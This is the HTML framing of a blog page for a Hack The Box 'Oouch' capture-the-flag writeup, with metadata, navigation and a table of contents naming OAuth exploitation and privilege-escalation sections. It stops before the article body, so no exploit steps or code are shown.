<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  <title>HTB - Oouch &middot; squ4r00t</title>
    <meta name="title" content="HTB - Oouch &middot; squ4r00t">

  
  <meta name="description" content="Writeup for the &#39;Hard&#39; rated machine: Oouch">
  <meta name="keywords" content="ctf,htb,oauth,oauth2,authorization code,csrf,dbus,uwsgi,">
  
  
  <link rel="canonical" href="http://localhost:1313/htb/oouch/">
  
  
  
  
  
  
  
  
  
    
  
  
    
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.08c3b9aed1319530a6e2c6e0dcba1f900b303e715be3d6a2b8ab81127aab94554c7ea7cb998fd0bbd3e23df13c3beff718fd83d27134f8a9f39b7059de9ce5cb.css"
    integrity="sha512-CMO5rtExlTCm4sbg3LofkAswPnFb49aiuKuBEnqrlFVMfqfLmY/Qu9PiPfE8O&#43;/3GP2D0nE0&#43;Knzm3BZ3pzlyw==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
    
    
    
  
  
    
    
  
  
  
  
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.98bb8ce8f123e03c4d2171eeec151dd404b5c476beb5ef1068d0e8b1a2afb923065e6552fc14b2d867c85ee4bd8529a43193f729f874d3908517ba03b5d1cc57.js"
      integrity="sha512-mLuM6PEj4DxNIXHu7BUd1AS1xHa&#43;te8QaNDosaKvuSMGXmVS/BSy2GfIXuS9hSmkMZP3Kfh005CFF7oDtdHMVw=="
      data-copy="Copy"
      data-copied="Copied"></script>
  
  
    
    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
  

  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  
  
  
  
  

  
  <meta property="og:url" content="http://localhost:1313/htb/oouch/">
  <meta property="og:site_name" content="squ4r00t">
  <meta property="og:title" content="HTB - Oouch">
  <meta property="og:description" content="Writeup for the &#39;Hard&#39; rated machine: Oouch">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="htb">
    <meta property="article:published_time" content="2025-05-10T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-05-10T00:00:00+00:00">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Htb">
    <meta property="article:tag" content="Oauth">
    <meta property="article:tag" content="Oauth2">
    <meta property="article:tag" content="Authorization Code">
    <meta property="article:tag" content="Csrf">
    <meta property="og:image" content="http://localhost:1313/htb/oouch/featured.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/htb/oouch/featured.png">
  <meta name="twitter:title" content="HTB - Oouch">
  <meta name="twitter:description" content="Writeup for the &#39;Hard&#39; rated machine: Oouch">
<meta name="twitter:image" content="http://localhost:1313/htb/oouch/featured.png">
    <meta property="og:image" content="http://localhost:1313/htb/oouch/featured.png">
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Htbs",
    "name": "HTB - Oouch",
    "headline": "HTB - Oouch",
    "description": "Writeup for the \u0027Hard\u0027 rated machine: Oouch",
    
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/htb\/oouch\/",
    "author" : {
      "@type": "Person",
      "name": "squ4r00t"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-05-10T00:00:00\u002b00:00",
    "datePublished": "2025-05-10T00:00:00\u002b00:00",
    
    "dateModified": "2025-05-10T00:00:00\u002b00:00",
    
    "keywords": ["ctf","htb","oauth","oauth2","authorization code","csrf","dbus","uwsgi"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2661"
  }]
  </script>



  
  
    <meta name="author" content="squ4r00t">
  
  
    
      
        
          <link href="https://github.com/squ4r00t" rel="me">
        
      
    
      
        
          <link href="https://twitter.com/squ4r00t" rel="me">
        
      
    
      
        
          <link href="https://app.hackthebox.com/profile/1634933" rel="me">
        
      
    
  

  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>























  
  





  
  

  
  

  
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      













<div
  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
  
  

  <div class="flex flex-1 items-center justify-between">
    <nav class="flex space-x-3">
      
        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
          squ4r00t
        </a>
      
    </nav>
    
  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
    
      
        
  <a
  href="/posts/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Posts">
    Blog
  </p>
</a>



      
        
  <a
  href="/htb/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Htbs">
    HTB
  </p>
</a>



      
        
  <a
  href="/portswigger/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Portswiggers">
    Portswigger
  </p>
</a>



      
        
  <a
  href="/tags/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Tags">
    Tags
  </p>
</a>



      
    

    

    

    
      <button
        id="search-button"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
  </nav>

    
  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
    <span></span>

    

    

    
      <button
        id="search-button-mobile"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
  </div>

  </div>
  
  <div class="-my-2 md:hidden">
    <div id="menu-button" class="block">
      
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
          <ul
            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
            <li id="menu-close-button">
              <span
                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
              </span>
            </li>

            
              
  <li class="mt-1">
  <a
    href="/posts/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Posts">
      Blog
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/htb/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Htbs">
      HTB
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/portswigger/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Portswiggers">
      Portswigger
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/tags/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Tags">
      Tags
    </p>
  </a>
</li>



            

          </ul>
          
        </div>
      
    </div>
  </div>

</div>





    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        


    <div id="hero" class="h-[150px] md:h-[200px]"></div>
  
  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
    
    
      
    
    <img
      id="background-image"
      src="/htb/oouch/featured_hu_32a9cc6f54d027ca.png"
      alt="Background Image"
      class="absolute inset-0 w-full h-full object-cover">
    <div
      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
    <div
      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
  </div>

  
    <div
      id="background-blur"
      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
    
    
    <script
      type="text/javascript"
      src="/js/background-blur.min.0ad33cb9c066f652728b2cc09c9ceaf32645544f48e8b6b38f120d86f433ed997da275a49e6151fe0176430c45376812708d84727f3f969101fb44a4345b3f34.js"
      integrity="sha512-CtM8ucBm9lJyiyzAnJzq8yZFVE9I6LazjxINhvQz7Zl9onWknmFR/gF2QwxFN2gScI2Ecn8/lpEB&#43;0SkNFs/NA=="
      data-target-id="background-blur"
      data-image-id="background-image"
      data-image-url="/htb/oouch/featured.png"></script>
  
      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        HTB - Oouch
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-05-10T00:00:00&#43;00:00">10 May 2025</time><span class="px-2 text-primary-500">&middot;</span><span>2661 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">13 mins</span>
    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ctf/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ctf
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/htb/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Htb
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/oauth/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Oauth
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/oauth2/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Oauth2
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/authorization-code/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Authorization Code
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/csrf/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Csrf
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/dbus/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Dbus
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/uwsgi/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Uwsgi
  </span>
</span>
</a
              >
            
          
        
      
    </div>
  

  
  



      </div>
      
        
  
  
  
  
  
  

  

  
    
    
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img
        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
        width="96"
        height="96"
        alt="squ4r00t"
        src="/img/ura_hu_1845844b3a12de73.jpeg">
    
  
  <div class="place-self-center">
    
      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        squ4r00t
      </div>
    
    
      <div class="text-sm text-neutral-700 dark:text-neutral-400">🧪 Experimenting</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/squ4r00t"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://twitter.com/squ4r00t"
          target="_blank"
          aria-label="Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://app.hackthebox.com/profile/1634933"
          target="_blank"
          aria-label="Hackthebox"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom"><span class="relative block icon"><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- Uploaded to: SVG Repo, www.svgrepo.com, Transformed by: SVG Repo Mixer Tools -->
<svg fill="#57e389" width="800px" height="800px" viewBox="0 0 24.00 24.00" role="img" xmlns="http://www.w3.org/2000/svg" stroke="#57e389" stroke-width="0.00024000000000000003">
<g id="SVGRepo_bgCarrier" stroke-width="0"/>
<g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"/>
<g id="SVGRepo_iconCarrier">
<path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/>
</g>
</svg></span></span></a
        >
      
    
  </div>

</div>
  </div>
</div>

  

  

  
    <div class="mb-5"></div>
  

      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
          <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#port-scanning">Port Scanning</a></li>
    <li><a href="#ftp">FTP</a></li>
    <li><a href="#website-at-5000">Website at :5000</a></li>
    <li><a href="#website-at-8000">Website at :8000</a>
      <ul>
        <li><a href="#how-oauth-works-">How Oauth works ?</a></li>
        <li><a href="#understanding-oouchs-oauth-flow">Understanding Oouch&rsquo;s OAuth Flow</a></li>
        <li><a href="#oauth-exploitation-part-1">OAuth Exploitation: Part 1</a></li>
        <li><a href="#oauth-exploitation-part-2">OAuth Exploitation: Part 2</a></li>
      </ul>
    </li>
    <li><a href="#privesc">Privesc</a>
      <ul>
        <li><a href="#qtc---www-data">qtc -&gt; www-data</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#port-scanning">Port Scanning</a></li>
    <li><a href="#ftp">FTP</a></li>
    <li><a href="#website-at-5000">Website at :5000</a></li>
    <li><a href="#website-at-8000">Website at :8000</a>
      <ul>
        <li><a href="#how-oauth-works-">How Oauth works ?</a></li>
        <li><a href="#understanding-oouchs-oauth-flow">Understanding Oouch&rsquo;s OAuth Flow</a></li>
        <li><a href="#oauth-exploitation-part-1">OAuth Exploitation: Part 1</a></li>
        <li><a href="#oauth-exploitation-part-2">OAuth Exploitation: Part 2</a></li>
      </ul>
    </li>
    <li><a href="#privesc">Privesc</a>
      <ul>
        <li><a href="#qtc---www-data">qtc -&gt; www-data</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


            
            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          <div class="lead text-neutral-500 dark:text-neutral-400 !mb-9 text-xl">
